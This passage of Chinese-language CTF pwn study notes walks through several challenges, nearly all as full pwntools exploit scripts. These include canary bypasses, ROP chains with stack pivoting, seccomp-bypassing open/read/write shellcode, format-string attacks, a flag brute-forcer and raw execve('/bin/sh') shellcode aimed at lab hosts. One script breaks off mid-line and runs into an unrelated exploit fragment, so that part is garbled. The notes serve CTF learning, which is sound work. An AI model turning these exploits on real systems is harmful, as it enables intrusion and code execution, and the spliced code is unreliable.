p.sendline("cat flag")
p.interactive()
```

# week3
## 不可思议的scnaf
这道题是有后门的。

[是要用scnaf来绕过canary](https://hnusec-star.feishu.cn/wiki/MBY5wupjOiIMNikeSSBcFEbBn8e)。查了资料以后发现scnaf如果输入的是参数（%d）的话.如果输入+，-。它会跳过输入。就用这个来跳过canary的检查

运行程序后输出一句话。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953408-9db7bbb7-36b0-42ea-acf0-58319918dbcb.png)

banner函数打不开应该就是画的老八的这张图的函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953642-e0a08b86-3ffc-4fa6-a941-b8dcb81547c2.png)

有溢出。v6这有个数组越界。向v6写16个但是只有6个.我们可以先用加号把前面的canary跳过。然后输入后门函数再退出（覆盖rbp）。再把剩下的填满。（保证平衡还是对齐）

加号就是占位符。把原来的canary的值给占了。反正就是跳过了

但是这个地址不知道是什么。给的wp里面是0x401240不知道这个是干什么的

后来查了一下原来是这样

之后改成现在的后门的就行


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953991-20480d89-30d4-4ca5-ac6b-9f97cfa316f0.png)

现在的后门的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530953676-2fc68204-b748-4e37-8082-6c59dae7e2b3.png)

远程没改。后门还是原来的

```plain
from pwn import *

#context(arch='amd64', os='linux')

p = remote('192.168.202.1', 10291)

for _ in range(10):
    p.recvuntil('わたし、気になります！')
    p.sendline(b'+')

p.recvuntil('わたし、気になります！')
p.sendline(str(0x401261))

p.recvuntil('わたし、気になります！')
p.sendline(str(0))

for _ in range(4):
    p.recvuntil('わたし、気になります！')
    p.sendline(b'+')

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954195-ae77b2d3-fd96-43e0-a127-cbdc054e70a1.png)

## Easy_Shellcode
沙箱题。禁用了orw。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954171-0af5558c-4fb8-47c1-932d-f675441b075a.png)

ai分析了一下sandbox.具体是这些

+ **禁止的系统调用：**`execve`、`execveat`、`open`、`openat`、`read`、`write` 等。
+ **允许的系统调用：**`openat2`、`readv`、`pread64`、`writev`、`sendfile` 等。

因此，攻击者无法使用常规的 `open` 或 `read` 系统调用来读取文件。

我们可以利用 openat 打开 /flag 文件，使用 sendfile 将文件内容输出到标准输出，从而绕过沙箱限制，获取 flag。

```plain
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

p = process('./Easy_Shellcode')
# p = remote('192.168.202.1', 57531)
elf = ELF('./Easy_Shellcode')

shellcode = '''
    mov rsp, 0x4040c0
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)

p.sendlineafter(b'Welcome', payload)

p.interactive()
```

不同函数都有调用规则。这用的openat和sendfile.[沙箱sandbox](https://hnusec-star.feishu.cn/wiki/ZZPYwEcXTiZLBpkgPdYcVQGYn7f)

手写的shellcode

```plain
from pwn import *

#context(arch='amd64', os='linux', log_level='debug')

p = process('./Easy_Shellcode')
p=remote('192.168.202.1',59734)

p.recvuntil(b'Welcome')
p.sendline(b'Hello')

shellcode = '''
    # 打开 /flag 文件
    mov rdi, 0x67616c66
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    #读取文件内容到栈
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0
    syscall

    #将读取的内容写入标准输出
    mov rdi, 1
    mov rax, 1
    syscall

    #正常退出
    mov rax, 60
    xor rdi, rdi
    syscall
'''

payload = asm(shellcode)

p.sendline(payload)

p.interactive()
```

## One Last B1te
buf只有一次写的机会。但是我们可以通过两次read修改


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954399-001336c1-2533-4b47-bd9d-825946b1f179.png)

第一次是直接把8个字节读给buf指针。第二次是读一字节给buf。我们可以这样。先给buf一个地址，然后再通过读一个字节通过buf写一个东西。主要可以这样

篡改关键控制数据（如函数返回地址的高位或低位），进而实现控制流劫持。

如果这样的话。那我们先改libc。有了libc之后再算其它的。然后再栈溢出。orw rop链的。

溢出的话主要就是第三个read。它可以读0x100的

泄露libc的方法可以是这个。把close的got表改成write的plt表。利用write把它打印出来

程序中只有 `write` 函数可以进行输出，我们可以利用一个字节任意地址写的机会，把 `close` 函数的 GOT 表的数值改为`write`函数的 PLT 表的地址（因为存在延迟绑定，`close` 在第一次调用之前指向的是 PLT 中的表项，我们很容易利用修改最低一个字节的方法来使其指向 `write` 函数的 PLT 表）。

之后由于 `close(1)` 设置第一个参数为 1，同时 `read(0, v5, 0x110uLL);` 会残留第 2、3 个参数，我们修改 `close` 的 GOT 表之后相当于执行 `write(1,v5,0x110uLL);`，就可以泄露栈上的内容，正好能泄露 libc 地址，之后利用栈溢出再次启动 `main` 函数栈溢出 ROP 即可。close(1)时会将rdi指向的值泄露

官方wp上写的是要交换的话用到

由于 glibc 2.39 版本不容易控制 rdx 寄存器，我们可以使用 `pop rax` + `xchg eax, edx` 的方法来设置 rdx 寄存器的数值。

`xchg edx, eax` 指令在 x86 汇编中用于 **交换** 两个寄存器的值。执行后，`EAX` 的原始值将被移入 `EDX`，而 `EDX` 的原始值则被移入 `EAX`。这一操作对程序标志寄存器（EFLAGS）没有影响，也没有副作用（如不设置零标志或进位标志）

[设置完mprotect](https://hnusec-star.feishu.cn/wiki/MBY5wupjOiIMNikeSSBcFEbBn8e)是像csu一样的调用

```plain
from pwn import *
ELFpath = './onelast'

p = remote('192.168.202.1',9506)
libc=ELF('./libc.so.6')

close_got = elf.got['close']
write_plt = elf.plt['write']
ret = 0x0401447
main = 0x4013a3
rubbish = 0x404800 


p.sendafter("Show me your UN-Lucky number :", p64(close_got))
p.sendafter("Try to hack your UN-Lucky number with one byte :", b'\xc0')


payload = b'a' * 0x18 + p64(ret) + p64(main)
p.send(payload)

p.recvuntil(b'a' * 0x18)
p.recv(0xb8 - 0x18)
libc_base = u64(p.recv(6) + b'\x00\x00') - 0x710b26c2a28b + 0x710b26c00000


p.sendafter("Show me your UN-Lucky number :", p64(rubbish))
p.sendafter("Try to hack your UN-Lucky number with one byte :", b'\x70')


pop_rdi = libc_base + 0x010f75b
pop_rsi = libc_base + 0x110a4d
binsh = libc_base + 0x1cb42f
xchg_edx_eax = libc_base + 0x01a7f27
pop_rax = libc_base + 0x0dd237
open_a = libc_base + libc.sym['open']
read_a = libc_base + libc.sym['read']
mprotect = libc_base + 0x00125C10

#填充缓冲区
payload = b'a' * 0x18 

#设置mprotect设置内存权限
#rdi里写成更改的起始地址
payload += p64(pop_rdi)  
payload += p64(libc_base + 0x202000) 
#rsi里填修改的大小
payload += p64(pop_rsi) 
payload += p64(0x2000) 
#先把值赋给rax之后做交换。要全改。mprotect参数设置为7
payload += p64(pop_rax)  
payload += p64(7)  
#用xchg交换
payload += p64(xchg_edx_eax)
payload += p64(mprotect) 

#read函数rdi根据规则置0 
payload += p64(pop_rdi)  
payload += p64(0)
#rsi指向修改的地址（要读的）  
payload += p64(pop_rsi) 
payload += p64(libc_base + 0x202000)
#rax读取最大长度 
payload += p64(pop_rax) 
payload += p64(0x1000)
#交换 
payload += p64(xchg_edx_eax)  
payload += p64(read_a)
#返回地址改成shellcoode起始  
payload += p64(libc_base + 0x202000)
p.sendline(payload)

#shellcode写orw
shellcode = shellcraft.open('./flag', 0, 0)
shellcode += shellcraft.read('rax', libc_base + 0x202000 + 0x800, 0x100)
shellcode += shellcraft.write(2, libc_base + 0x202000 + 0x800, 'rax')


p.send(asm(shellcode))
p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954285-6ae3b551-8c05-4e67-9c62-ee539ae73d18.png)

```plain
p.sendafter("Show me your UN-Lucky number :", p64(close_got))
p.sendafter("Try to hack your UN-Lucky number with one byte :", b'\xc0')

payload = b'a' * 0x18 + p64(ret) + p64(main)
p.send(payload)

p.recvuntil(b'a' * 0x18)
p.recv(0xb8 - 0x18)
libc_base = u64(p.recv(6) + b'\x00\x00') - 0x710b26c2a28b + 0x710b26c00000

p.sendafter("Show me your UN-Lucky number :", p64(rubbish))
p.sendafter("Try to hack your UN-Lucky number with one byte :", b'\x70')
```

先把close.got表的低位写成xc0。write在libc中的低位地址。填充以后返回接收libc。填充是为了再改一遍。把这个rubbish低位改成x70。不知道这个rubbish是改的什么.第一下看成0x404000。以为改的是这个


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955181-25673a35-ec5c-4f9d-b09f-dc6113e7d7d1.png)


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530954905-16f31bc1-5648-4c71-b679-62b7973df804.png)

0x404800没有了。不知道它这个改的哪。

## ezcanary
这个爆破不出来

```plain
from pwn import *

p = remote('192.168.202.1', 59734)
canary = b'\x00'

for byte_index in range(1, 8):
    for guess in range(256):
        payload = b'A' * (0x60 - 8)
        payload += canary
        payload += p8(guess)
        p.sendafter('你觉得呢？\n', payload)
        resp = p.recvuntil('\n', timeout=1)
        if b"*** stack smashing detected ***" in resp:
            p.send('n\n')
        else:
            canary += p8(guess)
            info(f"[+] Found canary byte {byte_index}: 0x{guess:02x}")
            break
    else:
        log.error(f"Failed to find byte {byte_index}")
        exit(1)

    if byte_index != 7:
        p.send('a\n')
    else:
        p.sendline('cat flag')

canary_val = u64(canary)
print("Canary is:", hex(canary_val))

payload2 = b'A' * (0x60 - 8)
payload2 += p64(canary_val)
payload2 += p64(0)
payload2 += p64(0x401251)
p.sendafter("bruteforce\n", payload2)
p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955144-3d748e7c-ae6c-4174-8595-689138ffd982.png)

# week4
## signin
fgo的英灵克制系统吗。关键我怎么知道对面每次出什么职阶的。纯赌运气到1145分吗🤔。

剑弓枪互克，骑术杀互克。狂阶与其它全部互克

裁仇月互克，他人格伪降互克，盾兵无克制。还有单克的记不起来了。不能cheat看看这个游戏怎么玩

486打法吗。无限读档这块。用狂战士breasker无限回档吧。

```plain
from pwn import *

#context(log_level='debug', arch='amd64', os='linux')
p=remote('192.168.202.1',45950)

#p = process('./Signin')
p.sendlineafter(b'Enter your name:', b'inkey')
elf = ELF('./Signin')

score = 0

def fight():
    global score
    p.sendlineafter(b'6. Save file', b'1')
    p.sendlineafter(b'Choose your class:', b'Berserker')
    p.recvline() 
    result = b'You beated' in p.recvline()
    p.recvuntil(b'Now you have ')
    score = int(p.recvuntil(b' sorce', drop=True))
    p.sendline(b'')
    p.sendline(b'')
    return result

def save():
    p.sendlineafter(b'6. Save file', b'6')
    p.sendline(b'')  # 发送空行

def load():
    p.sendlineafter(b'6. Save file', b'5')
    p.sendline(b'')  # 发送空行

load()

while True:
    if fight():
        print("win")
        print(f"score: {score}")
        if score > 1145:
            break
        save()
    else:
        print("lose")
        print(f"score: {score}")
        load()

print("Got shell")
p.sendline(b"cat /flag")

p.interactive()
```

## MakeHero
照着wp先写了一下。有点还没看懂

```plain
from pwn import *

p = remote('192.168.202.1', 14310)
libc = ELF('./herolibc.so.6')

context(arch='amd64', os='linux')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def u8_ex(data):
    if isinstance(data, str):
        data = data.encode('latin-1')
    data = data.ljust(1, b'\x00')
    return u64(data)

def write_mem(addr, val):
    if isinstance(val, bytes):
        data = val
    else:
        data = p8(val)
    sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(u8_ex(data)))

def write_code(addr, code_bytes):
    for i, b in enumerate(code_bytes):
        write_mem(addr + i, b)

def my_recvuntil(delim):
    return p.recvuntil(delim)

my_recvuntil(b'** ')
code_base = int(p.recvuntil(b' -', drop=True), 16)
print('code_base =', hex(code_base))

my_recvuntil(b'## ')
libc_base = int(p.recvuntil(b' -', drop=True), 16)
print('libc_base =', hex(libc_base))

sl(b'inkey')

write_mem(code_base + 0x1877, 1)
write_mem(libc_base + libc.sym.exit + 4, b'\x90')
write_mem(code_base + 0x1877, 1)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff" \
            b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54" \
            b"\x5e\xb0\x3b\x0f\x05"
write_code(libc_base + libc.sym.exit + 5, shellcode)

sl(b'bye')
p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956257-b7637af8-f8eb-4ee1-b247-c23f6fdd060f.png)

## Reread
栈迁移和沙箱。read只能读0x50.覆盖完rbp以后只剩0x10.不够写rop。所以栈迁移

把rbp的值改成对应的地址。应该就是改到bss。然后加8是指针

看一下有没有leave


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956131-254c6aef-baa6-46a3-81ef-c92fea4bf298.png)

里面有leave rdi leave retn。


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955700-51b61aa7-9fd2-48ae-b26a-26041d85bc91.png)

查沙箱


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956066-a6f1ff79-565f-494c-a871-7392997b385c.png)

沙箱这也有个lev。迁移泄露完libc之后从这再orw。就bss段写这的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530955902-6d00eb08-b723-4508-8d43-8698b3554131.png)

然后

```plain
from pwn import *
import sys

elf = ELF('./reread')
libc = ELF('./libc.so.6')

p = remote('192.168.202.1',12229)

#填充覆盖返回到vuln里的lev
ok = b'A' * 0x40
write_bss = p64(elf.bss(0x800))
ret_addr1 = p64(0x4013ac)
payload1 = ok + write_bss + ret_addr1
p.send(payload1)

#泄露libc的rop链
pop_rdi = p64(0x401473)
got_puts = p64(elf.got['puts'])
plt_puts = p64(elf.plt['puts'])
vuln_return = p64(0x401394)
flag_path = b'./flag\x00\x00'
payload2 = pop_rdi + got_puts + plt_puts + vuln_return + flag_path
payload2 = payload2.ljust(0x40, b'\x00')

#设置泄露完libc的返回沙箱的lev
write_bss2 = p64(elf.bss(0x7b8))
ret_addr2  = p64(0x4012ec)
payload2 += write_bss2 + ret_addr2
p.send(payload2)

#接收
data = p.recvuntil(b'\x7f')
leaked_puts = data[-6:].ljust(8, b'\x00')
puts_addr = u64(leaked_puts)
log.info("leak_puts: " + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
libc.address = libc_base
log.success("leak_baselibc " + hex(libc_base))


pop_rdi_offset      = 0x000000000002601f
pop_rsi_r12_offset = 0x0000000000119431
pop_rax_offset      = 0x0000000000036174
syscall_offset      = 0x00000000000630a9
pop_rdi      = p64(libc_base + pop_rdi_offset)
pop_rsi_r12  = p64(libc_base + pop_rsi_r12_offset)
pop_rax      = p64(libc_base + pop_rax_offset)
syscall_gadg = p64(libc_base + syscall_offset)

#把写的rop全迁到bss上
payload3 = b'A' * 0x40
payload3 += p64(elf.bss(0xa00))
payload3 += p64(0x4013ac)
p.send(payload3)

#set read读bss上迁好的数据。执行
payload4 = pop_rdi + p64(0)
payload4 += pop_rsi_r12 + p64(elf.bss(0x9f8))
payload4 += pop_rsi_r12 + p64(0x400)
payload4 += p64(elf.plt['read'])
payload4 += p64(elf.bss(0x9b8)) + p64(0x4012ec)
p.send(payload4)

#返回了沙箱执行orw
orw = b''
orw += pop_rdi + p64(elf.bss(0x9f8))
orw += pop_rsi_r12 + p64(0)
orw += pop_rax
orw += syscall_gadg

orw += pop_rdi + p64(3)
orw += pop_rsi_r12 + p64(elf.bss(0x100))
orw += pop_rsi_r12 + p64(0x40)
orw += pop_rax
orw += syscall_gadg

orw += pop_rdi + p64(1)
orw += pop_rsi_r12 + p64(elf.bss(0x100))
orw += pop_rsi_r12 + p64(0x40)
orw += p64(libc_base + pop_rax_offset)
orw += syscall_gadg

orw2= orw.ljust(0x1f8, b'\x00')
data = b'./flag\x00\x00' + orw2
p.send(data)

p.interactive()
```


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956571-c257d3e6-91d5-4def-ac3e-cfe89df4f7a2.png)

## Maze_Rust
看的官方题解的。输一个2有隐藏关。然后让输凌地宁宁留下的数字（柚子厨蒸鹅心）。

然后0721输入进去。重进按三还有一关。它要解迷宫。输入最后的路径


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956583-19f84a9c-980e-415c-85ae-feca2059495a.png)

0721判断方法要看v74的地址。因为主要我感觉wp里面说的它跟产生有关。实际上它就跟产生迷宫有关。之后这个stage2在产生这一块找的

丢给ai看一下分析

看一下反汇编。它这个是有一个stage1和2.0721已经做完了stage1.stage2还要别的


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956863-85789519-dab1-4fc8-a7bc-6715d03f5563.png)

跟着这个方法找一下函数


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530956896-dc4456c0-d751-4844-a856-4d0726d59f91.png)

来到了产生和debug函数这。看产生和debug后面这个长串的引用

debug的另一个区域


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530957312-0d59ae06-86c5-467f-9795-16151df7c741.png)

第一个输出完以后会有提示。让我们return main menu


![](https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530957127-28caa587-420b-4007-a2b5-3e50d8bca34a.png)


# hnctf
## orw三步走
只写了一下shellcode的

```plain
payload = asm('''
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall

    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall

    mov edi,1                
    mov rsi,rsp        
    push 1
    pop rax
    syscall
    ''')
```

## Orw 有or没有w |shellcode
原来压缩包里给的exp我感觉能用，稍微改了一下没爆出来。

```plain
import os
import sys
import time
from pwn import *
from ctypes import *

context.os = 'linux'
#context.log_level = "debug"

#context(os = 'linux',log_level = "debug",arch = 'amd64')
s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
context.terminal = ['gnome-terminal','-x','sh','-c']

x64_32 = 1

if x64_32:
    context.arch = 'amd64'
else:
    context.arch = 'i386'

def exp(dis,char):
    p.recvuntil("Enter your command:")
    shellcode = asm('''
        mov r12,0x000067616c662f2e
        push r12
        mov rdi,rsp
        xor esi,esi
        xor edx,edx
        mov rax,2
        syscall
        mov rdi,rax
        mov rsi,rsp
        mov edx,0x100
        xor eax,eax
        syscall
        mov dl, byte ptr [rsi+{}]
        mov cl, {}
        cmp cl,dl
        jz loop
        mov eax,60
        syscall
        loop:
        jmp loop
        '''.format(dis,char))
    #pause()
    p.send(shellcode)
    
num_list = [48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122]
flag = "flag{"
tmp = 0
for i in range(len(flag),len(flag)+40):
    if tmp == 1:
            break
    for j in num_list:
        #p = process('./pwn')
        p = remote('27.25.151.198',37467)
        #gdb.attach(p,'b *read')
        try:
            log.success("{} pos : {} trying".format(i,chr(j)))
            exp(i,j)
            p.recvline(timeout=10)
            p.send(b'\n')
            log.success("{} pos : {} success".format(i,chr(j)))
            flag += chr(j)
            if chr(j) == '}':
                    tmp = 1
            p.close()
            break
        except:           
            p.close()
log.success("flag : {}".format(flag))
```

最开始原来自己写了一个。只爆出来字母了

```plain
from pwn import *
import string
import time

context(arch='amd64', os='linux')
# context.log_level = 'debug'

def build_shellcode(cmd_str):
    # 构造 execve("/bin/sh", ["sh", "-c", cmd_str], 0) 的 shellcode
    # 注意：这里直接返回汇编字符串，而不是函数调用
    return f'''
        /* 将 "/bin/sh" 压入栈 */
        mov rax, 0x68732f6e69622f
        push rax
        
        /* 设置 rdi = "/bin/sh" */
        mov rdi, rsp
        
        /* 构造 argv 数组 */
        xor rax, rax
        push rax        /* argv[3] = NULL */
        
        /* 将命令字符串压入栈并获取地址 */
        lea rbx, [rel command]
        push rbx        /* argv[2] = cmd_str */
        
        /* 压入 "-c" */
        mov rbx, 0x632d
        push rbx        /* argv[1] = "-c" */
        
        /* 设置 argv 数组 */
        mov rsi, rsp    /* rsi = &argv[1] */
        
        /* 压入程序名 */
        push rdi        /* argv[0] = "/bin/sh" */
        mov rsi, rsp    /* rsi = argv */
        
        /* 设置 rdx = envp (NULL) */
        xor rdx, rdx
        
        /* 调用 execve */
        mov rax, 59     /* SYS_execve */
        syscall
        
        /* 退出 */
        mov rax, 231
        xor rdi, rdi
        syscall
        
        command:
            .asciz "{cmd_str}"
    '''

def check_char(pos, char):
    # 构造测试命令 - 使用双引号避免单引号问题
    cmd = f"if [ $(dd if=flag bs=1 skip={pos} count=1 2>/dev/null) = \"{char}\" ]; then sleep 1; fi"
    print(f"Testing position {pos} with char '{char}' - command: {cmd}")
    
    try:
        # 构建 shellcode - 直接传递命令字符串
        shellcode_str = build_shellcode(cmd)
        sc = asm(shellcode_str)
    except Exception as e:
        print(f"Error assembling shellcode: {e}")
        return False
    
    # 发送并测量时间
    try:
        # p = process('./challenge')  # 本地测试
        p = remote("127.0.0.1", 1337)  # 替换为实际目标
        
        start_time = time.time()
        p.sendlineafter("Enter your command: ", sc)
        try:
            # 设置较短超时以检测延迟
            p.recv(timeout=0.5)
        except:
            pass
        elapsed = time.time() - start_time
        p.close()
        
        # 延迟超过 0.8 秒表示字符正确
        return elapsed > 0.8
    except Exception as e:
        print(f"Connection error: {e}")
        return False

# 主函数
def main():
    # 可安全测试的字符集 (避免特殊字符)
    safe_chars = string.ascii_letters + string.digits + "_{}@$.-"
    
    flag = ""
    pos = 0
    max_length = 50  # 假设flag最大长度
    
    while pos ",hex(leak_addr))
pie_base = leak_addr - 0x1060
print("pie_base  is ==>",hex(pie_base))

read_gadgets_addr = 0x11B5 + pie_base
bss_start = 0x4048 + pie_base + 0x600
puts_plt = elf.plt.puts + pie_base
main = 0x11A9  + pie_base

payload = b"a"*0x20 + p64(bss_start) + p64(0x10F0 + pie_base) + p64(puts_plt)  + p64(main)


p.sendline(payload)

leak_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success('leak_addr is  -->' + hex(leak_addr))

libc_base = leak_addr - 0x21b780
log.success('libc_base is  -->' + hex(libc_base))

# gdb.attach(p)


system = libc_base + libc.sym.system 
binsh = libc_base + libc.search(b'/bin/sh').__next__()
pop_rdi = libc_base + 0x000000000002a3e5
pop_rax = libc_base + 0x0000000000045eb0
rdx_rsi_ret = libc_base + 0x000000000011f2e7
syscall_ret = libc_base + 0x0000000000091316

#payload = b'a'*0x28 + p64(pop_rdi) +p64(binsh) + p64(pop_rdi + 1) +p64(system)
payload = b"a"*0x28 +  p64(pop_rax) + p64(0) + p64(rdx_rsi_ret) + p64(0x100) + p64(0) + p64(syscall_ret)

p.sendline(payload)

payload =b'a'*0x58+  p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(binsh) + p64(rdx_rsi_ret) + p64(0) + p64(0) + p64(0x000000000002be51+libc_base) + p64(0) + p64(syscall_ret) + p64(0)
sleep(1)
p.sendline(payload)
p.interactive()
```

# fd it
连上远程依次发送3，flag，1即可

fd的用法

# fmt_s
```python
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process("./pwn")

system_addr = 0x40127B

payload = b"SBA%13$p"
magic = b"a"*6 + b"\x00" + b"\x0a"
p.recvuntil("You start talking to him...\n")
# pause()
p.sendline(payload)
p.recvuntil(b"SBA")

leak_addr = int(p.recv(14),16)
print("leak_addr  is ==>",hex(leak_addr))
libc_base = leak_addr - 0x29d90
print("libc_base  is ==>",hex(libc_base))

p.recvuntil("You enraged the monster-prepare for battle!\n")

# pause()
p.send(magic)

p.recvuntil("You start talking to him...\n")

# pause()
p.sendline(payload)

p.recvuntil("You enraged the monster-prepare for battle!\n")

# pause()
p.send(magic)
one_gadget = 0xebc81 + libc_base
payload = "%{}c".format(str(0x2d0)).encode() + b"%36$hn"
payload = payload.ljust(0x10,b"\x00")
payload += p64(one_gadget)

print(len(payload))
p.recvuntil("You start talking to him...\n")
# pause()
p.sendline(payload)

p.recvuntil("You enraged the monster-prepare for battle!\n")

# pause()
p.send(magic）
p.interactive()
```

# fmt
```python
from pwn import *
import sys
import re

context(log_level="debug", arch="amd64", os="linux")
p = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

payload = b"%7$s%10$p"
p.sendline(payload)

p.recvuntil("Nice to meet you,")

data_line = p.recvline().strip()
v4 = data_line[:5].decode()       
s2_hex = data_line[5:].decode()  
s2_value = int(s2_hex, 16)      

print(f"v4 = {v4}")
print(f"s2 = {hex(s2_value)}")
s2_bytes = s2_value.to_bytes(8, 'little')
s2 = s2_bytes[:5]  
p.recvuntil("I buried two treasures on the stack.Can you find them?")

# gdb.attach(p)

p.sendline(s2)

p.recvuntil("Yeah,another one?\n")

p.sendline(v4)

p.interactive()
```

# laker
栈上有残留的数据，关键是要确定发xdulaker发到哪个位置，多少偏移。

```python
from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')

p=remote('192.168.202.1',59690)
#p = process('./laker')
elf = ELF('./laker')

p.sendline(b"1")
line = p.recvline_contains(b'gift')
addr = line.strip().split(b':')[-1]
leak = int(addr, 16)
log.success(f"Leaked address: {hex(leak)}")

base = leak - elf.symbols['opt']
backdoor = base + elf.symbols['backdoor']
log.success(f"PIE base = {hex(base)}")

p.sendline(b"2")
p.recvuntil(b"Hey,what's your name?!\n")
payload = b'A'*32+b"xdulaker" 
p.send(payload)
p.recvuntil(b"I will teach you a lesson.\n")

ret = base+0x000000000000101a
p.sendline(b"3")
offset = 0x38
payload = b'A'*offset+p64(ret)+p64(backdoor)

p.send(payload)
p.interactive()
```

# random
写了一个脚本

```python
from pwn import *
import sys
import ctypes

p = process("./pwn")

def simulate_seed_transformation(init_seed):
    """模拟种子变换过程（不依赖libc）"""
    seed = init_seed

    for _ in range(120):
        if seed & 1:
            seed = (3 * seed + 1) & 0xFFFFFFFF
        else:
            seed = seed >> 1

    while seed % 2 == 0:
        if seed & 1:
            seed = (3 * seed + 1) & 0xFFFFFFFF
        else:
            seed = seed >> 1
    return seed

def main():
    
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"  # 替换为实际libc路径
    
    try:
        libc = ctypes.CDLL(libc_path)
    except:
        log.error(f"无法加载libc: {libc_path}")
        return
    
    for init_seed in range(1, 101):
        try:
            #r = remote(host, port)
            r = process("./pwn")
            r.recvuntil("My lock looks strange—can you help me?")
            
            final_seed = simulate_seed_transformation(init_seed)
            libc.srand(final_seed)
            
            passwords = []
            for i in range(10):
                rand_val = libc.rand() % 10000
                passwords.append(str(rand_val))
            
            for i in range(10):
                r.recvuntil(f"password {i+1}\n>")
                r.sendline(passwords[i])
            
            response = r.recvline(timeout=1)
            if b'It opened' in response:
                flag = r.recvall().decode()
                log.success(f"成功! 种子={init_seed}, flag={flag}")
                r.close()
                return
            r.close()
        except Exception as e:
            log.warning(f"种子 {init_seed} 失败: {str(e)}")
            try: r.close()
            except: pass
    
    log.error("所有种子尝试失败")

if __name__ == "__main__":
    main()
p.interactive()
```

# shellcode
```python
from pwn import *

context.clear()
context.os   = 'linux'
context.arch = 'amd64'        
context.log_level = 'info'    


sc = b"\x48\x31\xff\x48\x8d\x3d\x00\x00\x00\x00\x48\x31\xf6\xb8\x3b\x00\x00\x00\x0f\x05\x48\x65\x66\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00"   

p = process(b'./shellcode')


p.sendline(b'4')              

p.send(sc)

p.interactive()
```

# str_
```python
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process("./pwn")
elf = ELF("./pwn")


p = process('./pwn') 
# p = remote('host', port)  

str_input = b"meowmeow" + b"\x00" * 0x20 + p64(0x40123B) 
n_input = str(0x30) 

p.recvuntil("What can u say?")
p.sendline(str_input)
p.recvuntil("So,what size is it?")

p.sendline(n_input)


p.interactive()
```

# syscall
-32是要算一下一个精确的数

系统调用写在bss 。read 0x100不够

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')  
exe = context.binary = ELF('./syslock')
io = process('./syslock')


io.recvuntil(b'choose mode')
io.sendline(b'-32')

io.recvuntil(b'Input your password')
payload1 = b'\x3b\x00\x00\x00' + b'A' * 8  
io.sendline(payload1)

print(io.recvall(timeout=1))

pop_rdi=0x0000000000401240 
pop_rax=0x0000000000401244 
pop_rsi=0x0000000000401241
pop_rdx=0x0000000000401242
syscall=0x0000000000401230 
#binsh = next(exe.search(b'/bin/sh\x00'))
bss_addr  = exe.bss() + 0x500
read_plt  = exe.plt.get('read')

stage1  = b'A' * (64+8)
stage1 += p64(pop_rdi) + p64(0)            # rdi = 0 (stdin)
stage1 += p64(pop_rsi) + p64(bss_addr)     # rsi = .bss
stage1 += p64(pop_rdx) + p64(8)            # rdx = 8
stage1 += p64(read_plt)                    # read(0, .bss, 8)

stage2  = p64(pop_rax) + p64(59)           # rax = 59 (execve)
stage2 += p64(pop_rdi) + p64(bss_addr)     # rdi = &"/bin/sh"
stage2 += p64(pop_rsi) + p64(0)            # rsi = 0
stage2 += p64(pop_rdx) + p64(0)            # rdx = 0
stage2 += p64(syscall)                     # syscall

payload = stage1 + stage2

#io.recvuntil(b'Developer Mode.\n')
log.info("Sending payload now...")
